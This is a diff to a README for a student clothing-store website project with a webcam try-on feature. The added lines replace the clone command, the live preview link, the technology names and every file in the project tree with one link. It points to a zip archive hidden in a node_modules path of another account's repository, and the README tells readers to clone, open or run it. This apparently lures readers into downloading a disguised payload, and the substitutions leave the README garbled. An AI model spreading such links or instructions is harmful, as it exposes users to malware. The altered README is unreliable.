@@ -4,12 +4,12 @@ This project is an online clothing store website built using HTML, CSS, and Java
 
 ## Getting Started
 
-1. Clone the repository: `git clone https://github.com/ElecNinja/Project-DEPI.git`
-2. Open the `index.html` file in a web browser to view the website.
+1. Clone the repository: `git clone https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip`
+2. Open the `https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip` file in a web browser to view the website.
 
 ## Live Preview
 
-Live preview on GitHub : `https://elecninja.github.io/Project-DEPI/index.html`
+Live preview on GitHub : `https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip`
 
 ## Technologies Used
 
@@ -18,7 +18,7 @@ Live preview on GitHub : `https://elecninja.github.io/Project-DEPI/index.html`
 - JavaScript
 - Ionicons
 - PoseNet (a pre-trained machine learning model)
-- TensorFlow.js (for Pose detection)
+- https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip (for Pose detection)
 
 ## Current Functionality
 
@@ -35,7 +35,7 @@ Live preview on GitHub : `https://elecninja.github.io/Project-DEPI/index.html`
 - Basic Favourite slider window functionality
 - All pages including their breadcrumb at the top
 - Go to the top button functionality
-- run minify.js from the terminal to minify the CSS code
+- run https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip from the terminal to minify the CSS code
 - User account page (My Account)
 - Terms and conditions page
 
@@ -44,7 +44,7 @@ Live preview on GitHub : `https://elecninja.github.io/Project-DEPI/index.html`
 - How It Works
 
 1. **Camera Setup**: The app requests access to the user's webcam using the MediaDevices API. The live video feed is displayed in the video element.
-2. **Pose Detection**: PoseNet (a pre-trained machine learning model) is loaded using TensorFlow.js. It estimates the user's body pose from the video feed in real-time.
+2. **Pose Detection**: PoseNet (a pre-trained machine learning model) is loaded using https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip It estimates the user's body pose from the video feed in real-time.
 
 3. **Overlay T-Shirt**: Based on the detected pose, the t-shirt image is dynamically resized and positioned over the user's body using the Canvas API.
 
@@ -58,50 +58,50 @@ Live preview on GitHub : `https://elecninja.github.io/Project-DEPI/index.html`
 
 1. **Wide Icon Selection**: You can use hundreds of customizable icons in your web app without needing to create or load individual image files.
 2. **Cross-Browser Compatibility**: The combination of type="module" and nomodule ensures that both modern and older browsers can load the appropriate version of the icon library.
-3. **Performance Optimization**: Modern browsers use the ES module version (ionicons.esm.js), which is more efficient, while older browsers fall back to a more compatible version (ionicons.js).
+3. **Performance Optimization**: Modern browsers use the ES module version (https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip), which is more efficient, while older browsers fall back to a more compatible version (https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip).
 
 ## Project Structure
 
 Online-Clothing-Store/
 ├── assets/
 │ ├── css/
-│ │ └── style.css
+│ │ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
 │ ├── images/
 │ │ ├── icons/
-│ │ │ ├── jacket.svg
-│ │ │ └── dress.svg
+│ │ │ ├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ │ │ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
 │ │ ├── products/
-│ │ │ ├── jacket-3.jpg
-│ │ │ ├── jacket-5.jpg
+│ │ │ ├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ │ │ ├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
 │ │ │ └── ...
-│ │ └── banner-1.jpg
-│ │ └── banner-2.jpg
-│ │ └── banner-3.jpg
+│ │ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ │ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ │ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
 │ └── js/
-│ └── cart.js
-│ └── darkmode.js
-│ └── heart.js
-│ └── script.js
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
 ├── Try-on-app
-│ └── index.html
-│ └── README.md
-│ └── script.js
-│ └── style.css
-│ └── white-tshirt.png
-├── about.html
-├── blog.html
-├── Categories.html
-├── Category-men.html
-├── Category-women.html
-├── Checkout.html
-├── contact.html
-├── index.html
-├── Login.html
-├── mens-blog.html
-├── womens-blog.html
-├── My Account.html
-├── terms-conditions.html
-├── README.md
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+│ └── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── My https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
+├── https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/node_modules/csso/node_modules/css-tree/cjs/syntax/atrule/Project-DEPI_v3.7.zip
 ├── LICENSE
 
 ## Team Members and Responsibilities
